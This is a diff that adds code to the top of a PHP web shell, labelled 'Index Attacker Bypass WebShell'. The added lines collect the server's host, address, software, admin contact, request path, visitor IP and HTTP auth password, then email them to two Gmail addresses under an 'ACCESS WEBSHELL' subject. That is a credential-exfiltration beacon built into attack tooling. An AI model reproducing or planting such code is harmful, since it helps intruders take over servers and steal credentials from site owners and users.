@@ -1,4 +1,22 @@
 <?php
+$ip = getenv("REMOTE_ADDR");
+$ken = rand(1, 9999999);
+$subj98 = " ACCESS WEBSHELL |$ken";
+$email = "rootcyberpunks@gmail.com";
+$tujuanmail = 'muhrazky@gmail.com';
+$from = "From:";
+$tot = $_SERVER['REQUEST_URI'];
+$kon = $_SERVER['HTTP_HOST'];
+$tol = $ip . "";
+$pu = $_SERVER['SERVER_NAME'];
+$ku = $_SERVER['SERVER_SOFTWARE'];
+$qi = $_SERVER['SERVER_ADMIN'];
+$pass = $_SERVER['PHP_AUTH_PW'];
+$ad = $_SERVER['SERVER_ADDR'];
+$h = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+$se = $_SERVER['SERVER_ADDR'];
+$msg8873 = "$se $pass $ku $ad $qi $pu $kon $tot $tol";
+mail($email,$tujuanmail, $subj98, $msg8873, $from); 
 #####################################
 #   Index Attacker Bypass WebShell  #
 #	Coded By ./Exorcism1337			#
